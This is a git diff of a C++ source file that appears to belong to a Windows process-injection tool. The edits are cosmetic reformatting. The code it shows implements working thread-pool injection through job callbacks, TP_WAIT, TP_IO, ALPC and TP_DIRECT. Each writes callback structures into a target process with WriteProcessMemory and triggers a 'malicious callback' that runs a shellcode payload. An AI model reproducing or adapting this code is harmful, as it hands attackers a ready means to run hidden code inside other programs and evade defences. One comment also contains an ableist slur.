@@ -1,14 +1,14 @@
 #include "../include/injection.hpp"
 
 
-
 bool InjectViaJobCallback(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HANDLE hIoPort) {
 
-	HANDLE hJob = NULL;				NTSTATUS status = 0x00;
-	void* remoteMemory = nullptr;			PFULL_TP_JOB pFullTpJob = { 0 };
-	size_t regionSize = NULL;			JOBOBJECT_ASSOCIATE_COMPLETION_PORT completionPort = { 0 };
-
-
+	NTSTATUS status         = 0x00;
+	void* remoteMemory      = nullptr;			
+	HANDLE hJob             = nullptr;
+	PFULL_TP_JOB pFullTpJob = { 0 };
+	size_t regionSize       = NULL;			
+	JOBOBJECT_ASSOCIATE_COMPLETION_PORT completionPort = { 0 };
 
 
 	fnTpAllocJobNotification pTpAllocJobNotification =
@@ -61,7 +61,6 @@ bool InjectViaJobCallback(_In_ HANDLE targetProcess, _In_ void* payloadAddress, 
 		return false;
 	}
 
-
 	//
 	// We have to zero out the associated completion port first, not sure why.
 	// Need to look into this later
@@ -75,8 +74,6 @@ bool InjectViaJobCallback(_In_ HANDLE targetProcess, _In_ void* payloadAddress, 
 		WIN32_ERR(SetInformationJobObject[1]);
 		return false;
 	}
-
-
 
 	//
 	// Associate completion port with payload
@@ -93,7 +90,6 @@ bool InjectViaJobCallback(_In_ HANDLE targetProcess, _In_ void* payloadAddress, 
 		WIN32_ERR(SetInformationJobObject[2]);
 		return false;
 	}
-
 
 	//
 	// Queue IO packet to job object completion port
@@ -114,23 +110,20 @@ bool InjectViaJobCallback(_In_ HANDLE targetProcess, _In_ void* payloadAddress, 
 bool InjectViaTpWait(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HANDLE hIoPort) {
 
 	fnNtAssociateWaitCompletionPacket pNtAssociateWaitCompletionPacket = nullptr;
-
-	PFULL_TP_WAIT pTpWait = nullptr;		void* remoteTpWait = nullptr;
-	void* remoteTpDirect = nullptr;			HANDLE hEvent = nullptr;
-	NTSTATUS status = ERROR_SUCCESS;
+	PFULL_TP_WAIT pTpWait   = nullptr;		
+	void* remoteTpWait      = nullptr;
+	void* remoteTpDirect    = nullptr;			
+	HANDLE hEvent           = nullptr;
+	NTSTATUS status         = ERROR_SUCCESS;
 
 
 	pNtAssociateWaitCompletionPacket = reinterpret_cast<fnNtAssociateWaitCompletionPacket>( //locate this stub
-
 		GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtAssociateWaitCompletionPacket"));
 
 	if (pNtAssociateWaitCompletionPacket == nullptr) {
 		std::cerr << "{!!} Failed to get NtAssociateWaitCompletionPacket Function Pointer." << std::endl;
 		return false;
 	}
-
-
-
 
 	//
 	// Create a TP_WAIT structure that will trigger our callback once an asynchronous event
@@ -145,7 +138,6 @@ bool InjectViaTpWait(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ 
 		WIN32_ERR(CreateThreadPoolWait);
 		return false;
 	}
-
 
 	//
 	// Allocate and write memory into the process for the TP_WAIT callback structure.
@@ -173,7 +165,6 @@ bool InjectViaTpWait(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ 
 		return false;
 	}
 
-
 	//
 	// Do the same for a TP_DIRECT structure. Note that this is a helper struct,
 	// used to trigger the actual callback once an IO packet is sent.
@@ -200,7 +191,6 @@ bool InjectViaTpWait(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ 
 		return false;
 	}
 
-
 	//
 	// Create event object
 	//
@@ -210,7 +200,6 @@ bool InjectViaTpWait(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ 
 		WIN32_ERR(CreateEventW);
 		return false;
 	}
-
 
 	status = pNtAssociateWaitCompletionPacket(pTpWait->WaitPkt, //< This Wait packet is associated with the shellcode
 		hIoPort,												//< Where to send this packet once event is signaled
@@ -226,7 +215,6 @@ bool InjectViaTpWait(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ 
 		return false;
 	}
 
-
 	//
 	// Queue the IO packet, triggering the callback
 	//
@@ -237,24 +225,25 @@ bool InjectViaTpWait(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ 
 }
 
 
-
 bool InjectViaTpIo(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HANDLE hIoPort) {
 
-	wchar_t fullFilePath[MAX_PATH] = { 0 };				wchar_t tempPath[MAX_PATH] = { 0 };
-	HANDLE hFile = nullptr;						PFULL_TP_IO pTpIo = nullptr;
-	void* pRemoteTpIo = nullptr;					IO_STATUS_BLOCK ioStatusBlock = { 0 };
-	fnNtSetInformationFile pNtSetInformationFile = nullptr;		FILE_COMPLETION_INFORMATION fileCompletionInfo = { 0 };
-	NTSTATUS status = 0x00;						uint32_t bytesWritten = NULL;
-	OVERLAPPED overlapped = { 0 };
-
+	wchar_t fullFilePath[MAX_PATH] = { 0 };				
+	wchar_t tempPath[MAX_PATH]     = { 0 };
+	HANDLE hFile                   = nullptr;						
+	PFULL_TP_IO pTpIo              = nullptr;
+	void* pRemoteTpIo              = nullptr;					
+	IO_STATUS_BLOCK ioStatusBlock  = { 0 };
+	NTSTATUS status                = 0x00;
+	uint32_t bytesWritten          = NULL;
+	OVERLAPPED overlapped          = { 0 };
+	fnNtSetInformationFile pNtSetInformationFile = nullptr;		
+	FILE_COMPLETION_INFORMATION fileCompletionInfo = { 0 };
 
 	pNtSetInformationFile = reinterpret_cast<fnNtSetInformationFile>(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtSetInformationFile"));
 
 	if (pNtSetInformationFile == nullptr) {
 		std::cerr << "{!!} Failed to get NtSetInformationFile Function Pointer." << std::endl;
 	}
-
-	
 
 
 	//
@@ -284,8 +273,6 @@ bool InjectViaTpIo(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HA
 		return false;
 	}
 
-
-
 	//
 	// Create TP_IO structure for our callback.
 	// Note: due to Microsoft's extreme retardation, the callback address
@@ -305,8 +292,6 @@ bool InjectViaTpIo(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HA
 	pTpIo->CleanupGroupMember.Callback = payloadAddress;
 	++(pTpIo->PendingIrpCount);
 
-
-
 	//
 	// Allocate TP_IO memory and write
 	//
@@ -322,7 +307,6 @@ bool InjectViaTpIo(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HA
 		return false;
 	}
 
-
 	if (!WriteProcessMemory(targetProcess,
 		pRemoteTpIo,
 		pTpIo,
@@ -332,8 +316,6 @@ bool InjectViaTpIo(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HA
 		WIN32_ERR(WriteProcessMemory);
 		return false;
 	}
-
-	
 
 	//
 	// Associate the file with the target process' IO completion port.
@@ -354,8 +336,6 @@ bool InjectViaTpIo(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HA
 		return false;
 	}
 
-
-
 	//
 	// Trigger the callback via file interaction.
 	//
@@ -374,8 +354,6 @@ bool InjectViaTpIo(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HA
 }
 
 
-
-
 void _RtlInitUnicodeString(OUT PUNICODE_STRING UsStruct, IN OPTIONAL PCWSTR Buffer) {
 
 	if ((UsStruct->Buffer = (PWSTR)Buffer)) {
@@ -392,9 +370,6 @@ void _RtlInitUnicodeString(OUT PUNICODE_STRING UsStruct, IN OPTIONAL PCWSTR Buff
 	else UsStruct->Length = UsStruct->MaximumLength = 0;
 }
 
-
-
-
 //
 // ALPC or Advanced Local Procedure Call objects are kernel objects that facilitate inter-process communication.
 // They are very similar to named pipes, but operate on a "connection" basis rather than
@@ -402,21 +377,24 @@ void _RtlInitUnicodeString(OUT PUNICODE_STRING UsStruct, IN OPTIONAL PCWSTR Buff
 //
 
 bool InjectViaAlpc(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HANDLE hIoPort) {
-
 	// Local Variables
-	NTSTATUS status = 0x00;					        fnNtAlpcCreatePort pNtAlpcCreatePort = nullptr;
-	HANDLE hTempApcPort = nullptr;				    fnTpAllocAlpcCompletion pTpAllocAlpcCompletion = nullptr;
-	void* remoteTpAlpc = nullptr;				    fnNtAlpcSetInformation pNtAlpcSetInformation = nullptr;
-	std::string alpcMessageString = MY_MESSAGE;		fnNtAlpcConnectPort pNtAlpcConnectPort = nullptr;
+	fnNtAlpcConnectPort pNtAlpcConnectPort         = nullptr;
+	fnNtAlpcCreatePort pNtAlpcCreatePort           = nullptr;
+	fnTpAllocAlpcCompletion pTpAllocAlpcCompletion = nullptr;
+	fnNtAlpcSetInformation pNtAlpcSetInformation   = nullptr;
 
+	NTSTATUS status                                = 0x00;		
+	HANDLE hRealApcPort                            = nullptr;
+	HANDLE hTempApcPort                            = nullptr;	
+	PFULL_TP_ALPC pFullTpAlpc                      = nullptr;
 
-	UNICODE_STRING usAlpcPortName = { 0 };			PFULL_TP_ALPC pFullTpAlpc = nullptr;		
-	OBJECT_ATTRIBUTES objectAttributes = { 0 };		ALPC_PORT_ATTRIBUTES alpcPortAttributes = { 0 };
-	HANDLE hRealApcPort = nullptr;				
+	void* remoteTpAlpc                             = nullptr;				    
+	std::string alpcMessageString                  = MY_MESSAGE;		
 
-	OBJECT_ATTRIBUTES clientAlpcAttributes = { 0 };
-
-
+	UNICODE_STRING usAlpcPortName                  = { 0 };			
+	OBJECT_ATTRIBUTES objectAttributes             = { 0 };		
+	ALPC_PORT_ATTRIBUTES alpcPortAttributes        = { 0 };
+	OBJECT_ATTRIBUTES clientAlpcAttributes         = { 0 };
 
 	pNtAlpcCreatePort       = reinterpret_cast<fnNtAlpcCreatePort>(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtAlpcCreatePort"));
 	pTpAllocAlpcCompletion  = reinterpret_cast<fnTpAllocAlpcCompletion>(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "TpAllocAlpcCompletion"));
@@ -427,7 +405,6 @@ bool InjectViaAlpc(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HA
 		std::cerr << "{!!} Failed to get ALPC-related function pointers." << std::endl;
 		return false;
 	}
-
 
 
 	//
@@ -443,8 +420,6 @@ bool InjectViaAlpc(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HA
 		return false;
 	}
 
-
-
 	//
 	// Create ALPC callback structure
 	//
@@ -459,8 +434,6 @@ bool InjectViaAlpc(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HA
 		NTAPI_ERR(TpAllocAlpcCompletion, status);
 		return false;
 	}
-
-
 
 	//
 	// Create Second Port
@@ -482,8 +455,6 @@ bool InjectViaAlpc(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HA
 		NTAPI_ERR(NtAlpcCreatePort, status);
 		return false;
 	}
-
-
 
 	//
 	// Copy ALPC callback struct into target process
@@ -510,8 +481,6 @@ bool InjectViaAlpc(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HA
 		return false;
 	}
 
-
-
 	//
 	// Associate the process' IO completion port with our ALPC object
 	//
@@ -529,8 +498,6 @@ bool InjectViaAlpc(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HA
 		NTAPI_ERR(NtAlpcSetInformation, status);
 	}
 
-
-
 	//
 	// Now we "only" need to send a message to the ALPC object,
 	// which is still INSANELY annoying to do.
@@ -545,15 +512,12 @@ bool InjectViaAlpc(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HA
 	std::copy(alpcMessageString.begin(), alpcMessageString.end(), clientAlpcMessage.PortMessage);
 	size_t clientAlpcMessageSize = sizeof(clientAlpcMessage);
 
-
-
 	//
 	// if a timeout for the ALPC connection is not specified, it will infinitely block.
 	//
 
 	LARGE_INTEGER timeout = { 0 };
 	timeout.QuadPart = -10000000;
-
 
 	//
 	// Initiate the ALPC port connection and send IO packet
@@ -578,23 +542,18 @@ bool InjectViaAlpc(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HA
 		return false;
 	}
 
-
 	return true;
 }
 
 
-
-
 bool InjectViaTpDirect(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ HANDLE hIoPort) {
 
-	TP_DIRECT direct = { 0 };
-	void* remoteTpDirect = nullptr;
+	TP_DIRECT direct                       = { 0 };
+	void* remoteTpDirect                   = nullptr;
 	fnNtSetIoCompletion pNtSetIoCompletion = nullptr;
-	NTSTATUS status = ERROR_SUCCESS;
-
+	NTSTATUS status                        = ERROR_SUCCESS;
 
 	direct.Callback = payloadAddress;
-
 
 	//
 	// Allocate remote memory for the TP_DIRECT structure
@@ -610,7 +569,6 @@ bool InjectViaTpDirect(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In
 		WIN32_ERR(VirtualAllocEx);
 		return false;
 	}
-
 
 	if (!WriteProcessMemory(targetProcess,
 		remoteTpDirect,
@@ -628,7 +586,6 @@ bool InjectViaTpDirect(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In
 		std::cerr << "{!!} Failed to get NtSetIoCompletion function pointer." << std::endl;
 		return false;
 	}
-
 
 	//
 	// Trigger malicious callback
